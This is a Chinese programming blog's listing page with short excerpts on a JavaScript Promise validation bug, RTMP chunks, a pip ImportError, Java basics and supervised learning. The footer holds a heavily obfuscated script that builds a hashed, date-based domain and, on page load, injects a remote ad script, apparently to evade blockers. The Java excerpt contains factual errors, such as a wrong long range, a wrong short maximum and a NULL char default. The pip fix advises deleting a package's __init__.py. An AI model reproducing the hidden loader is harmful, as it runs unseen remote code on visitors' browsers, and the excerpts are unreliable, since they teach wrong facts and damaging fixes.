立马反应到checkUsername()中的返回值并没有真正返回，代码如下
checkRegist()中先禁止表单提交，添加如下几行代码，把checkUsername（）的返回值打印出来看看： 输出结果是一个object promise对象
查阅资料后得知这个对象是js中异步操作的返回结果，是async关键字导致，在then回调函数中我们无法直接获得想要的返回值（true或false），现在的问题是同步请求无法正确返回值，异步请求也无法在合适的时机获取应有的值，那么如何做账户注册的校验？解决办法如下：
1）新增一个usernameFlag属性
2）回调函数中对其操作
3）通过外部属性值做判断
完美解决问题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3612f4a4fcf09b3ec9c36c70223fc81/" rel="bookmark">
			系统分析师-论文写作 框架搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b1404630e550cbe9a722796b7f750cd/" rel="bookmark">
			RTMP(2)：Chunk 和 Message
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这一篇笔记主要记录对 chunk 和 message 两个概念的理解。
一个不严谨的比喻 如果把一条 TCP 链接比喻成一条铁路，那么：
一个字节就是一份货物。一个 chunk 就是一辆火车。一条 chunk stream 就是一条轨道。一份 message 就是包含若干货物的清单，这些货物被装载至一辆或多辆火车(chunk)上。 需要注意：
两个方向上的 chunk stream 数量无需相等，编号可同可不同。同一个 message 产生的多个 chunk 只会在一条 chunk stream 串行发送。先发送的 chunk 一定先到达。多条 chunk stream 复用了一条 TCP 链接。 说的直接点：
chunk 就是一个报文——预先约定清楚的 header 字段(ID，类型，时间戳等等)，以及变长的负载数据(chunk data)。chunk stream 就是一串有相同 ID 的 chunk，借助 TCP 链接在网络上流动，从发送端流向接收端。 Chunk - 最小传输单元(这名是我胡诌的) 在 RTMP 层面，chunk 就是最小的传输单元，数据封装为 chunk 后方能通过 RTMP 协议进行发送。
Chunk 的字段可划分为四部分，如下图示：
Basic Header (1 - 3 bytes) 本部分包含两个字段，format 和 chunk stream id。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b1404630e550cbe9a722796b7f750cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92a31c9e6bab8ece0c0ddfb613df7ac6/" rel="bookmark">
			解决 ImportError: cannot import......
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		出现报错，百度一下没有答案
ImportError: cannot import name 'get_major_minor_version' from 'pip._internal.locations' (/home/snail/PycharmProjects/test/venv/lib/python3.10/site-packages/pip/_internal/locations/__init__.py)
ImportError: cannot import name 'get_major_minor_version' from 'pip._internal.locations' (/home/snail/PycharmProjects/test/venv/lib/python3.10/site-packages/pip/_internal/locations/__init__.py) 解决办法：删除__init__.py
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b3bccbed74c4bc5d4d2dae8c6e6a5a4/" rel="bookmark">
			Java的编程逻辑（Java基础）（SE传）【一】（执行语句 跳转实现原理 栈 内存分配）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java的编程逻辑（Java基础）（SE传） 文章目录 Java的编程逻辑（Java基础）（SE传）前言一、第一部分 编程基础&gt;编程基础1.1数据类型和变量1.2 条件执行1.3 跳转实现原理1.4 函数调用的基本原理1.4.1 栈的概念1.4.2 数组和对象的内存分配1.4.3 函数调用小结 总结 前言 作者是大一学生：
由于学习Java的路上出现了很多资料和视频还有很多的书籍，
作者本人很喜欢纸质书籍和手写笔记，
所以就将部分手写笔记，纸质书籍很适合的例子，
部分自己的理解，和直面面经问题的需要，
以上元素综合作此系列，
我更倾向于叫&gt;手账，写在博客里，
如果有需要可以看看，或许有些收获。如果喜欢可以收藏，
有任何意见或者建议可以私信或者留言。
一、第一部分 编程基础 这章节更倾向于编程语言基础薄弱的同学观看如果
如果有一定的编程基础可以自选跳过，
或者可以看一遍疏通一下基础的编程逻辑，
希望能帮到您！
&gt;编程基础 开头的开头我们可以了解一下什么是编程
计算机是个机器，主要由CPU,内存，硬盘，输入/输出设备组成。
计算机上跑着操作系统，现在有两类大家比较熟知，分别是Windows和Linux。
基本上，所有的数据都需要放在内存里去进行处理，而程序很大一部分工作就是操作在内存的数据。如何表示和操作数据，底层都是二进制表示，所以高级语言引用了数据类型和变量的概念。
1.1数据类型和变量 Java中基本数据类型（primitive type）包括:
数值类型：整数类型（byte，short, int, long)
浮点类型（float，double）
字符类型（char)
布尔类型：（boolead）
（看看就好）
byte：Java中最小的数据类型，在内存中占1个字节(8 bit)，取值范围-128~127即-2^7 ~ 2 ^7-1，默认值0
short：短整型，2个字节(16 bit)，取值范围-32768~32717即-2^15 ~ 2 ^15-1，默认值0
int：整型，用于存储整数，在内存中占4个字节，取值范围-2147483648~2147483647即-2^31 ~ 2 ^31-1，默认值0
long：长整型，在内存中占8个字节即-2^15 ~ 2 ^15-1，默认值0L（不加L默认为int类型）
float：浮点型，在内存中占4个字节，用于存储带小数点的数字（与double的区别在于float类型有效小数点只有6~7位），默认值0f
double：双精度浮点型，用于存储带有小数点的数字，在内存中占8个字节，默认值0
char：字符型，用于存储单个字符，内存中占2个字节，取值范围0~65535，默认值为NULL
boolean：布尔类型，占1个字节，用于判断真或假（仅有两个值，即true、false），默认值false
注：每种基本数据类型都有对应的数组类型
数组表示固定长度的同种数据类型的多条记录；这些数据在内存中连续存放
Java是面向对象的语言，除开基本数据类型，其他都是对象类型。
为了操作数据，需要把数据放在内存中。
内存就是在程序看来是一块有地址编号的连续的空间
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b3bccbed74c4bc5d4d2dae8c6e6a5a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69cd52c50e488eaeb5b951fff1f8cb32/" rel="bookmark">
			有监督学习（supervised learning)）与无监督学习（unsupervised learning）之间有何区别?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		机器学习中存在着三类模型，有监督学习、无监督学习和半监督学习，他们有何区别呢？
其实有无标签是区分监督学习与无监督学习的关键，这里的有无标签，指的是有没有事前确定标签。
1.有监督学习 有监督机器学习又被称为“有老师的学习”，所谓的老师就是标签。有监督的过程为先通过已知的训练样本（如已知输入和对应的输出）来训练，从而得到一个最优模型，再将这个模型应用在新的数据上，映射为输出结果。借此，模型就有了预知能力。
监督学习的关键是训练数据同时拥有输入变量(x)和输出变量(y);使用一个算法把输入到输出的映射关系——y=f(x)训练成一个模型，用这个模型对新的数据进行预测。所有的回归算法和分类算法都是监督学习算法，例如KNN、逻辑回归、朴素贝叶斯等。
总结下来，有监督的学习模型主要有下面的特征：
①有标签。
② 已经标记好的数据(labelled data)，用来做训练来预测新数据的类型(class)，或者是值。预测已有类型叫做分类(classification)，预测一个值叫做回归(regression)。
③ 常见的有监督学习算法：回归分析和统计分类。 常见的有监督学习算法：回归分析和统计分类。最典型的算法是KNN和SVM。
2.无监督学习 无监督机器学习也被称为“没有老师的学习”，相比于有监督学习模型，无监督学习模型没有训练的过程，而是直接拿数据进行建模分析，即通过机器学习自行学习探索。即训练数据只有输入变量(x)，并没有输出变量(y)，而目的就是将这些训练数据潜在的结构或者分布找出来，类似于去探索。
其典型的特征如下：
①输入数据没有被标记，也没有确定的结果。
②样本数据类别未知，需要根据样本间的相似性对样本集进行分类(聚类，clustering)试图使类内差距最小化，类间差距最大化。
在方法使用上，无监督学习有下面的两种思路：
①基于概率密度函数估计的直接方法：设法找到各类别在特征空间的分布参数，再进行分类。
② 基于样本间相似性度量的简洁聚类方法：其原理是设法定出不同类别的核心或初始内核，然后依据样本与核心之间的相似性度量将样本聚集成不同的类别。利用聚类结果，可以提取数据集中隐藏信息，对未来数据进行分类和预测。应用于数据挖掘，模式识别，图像处理等。 PCA和很多deep learning算法都属于无监督学习。机器学习中，所有的聚类算法都是无监督学习算法，例如K-Means、主成分分析（PCA）、高斯混合模型（GMM）等；
3.半监督学习 半监督学习也就是说有一部分数据有标签、另一部分数据没有标签。半监督学习(Semi-Supervised Learning，SSL)是模式识别和机器学习领域研究的重点问题，是监督学习与无监督学习相结合的一种学习方法。
半监督学习使用大量的未标记数据，以及同时使用标记数据，来进行模式识别工作。当使用半监督学习时，将会要求尽量少的人员来从事工作，同时，又能够带来比较高的准确性，因此，半监督学习正越来越受到人们的重视。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/279/">«</a>
	<span class="pagination__item pagination__item--current">280/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/281/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>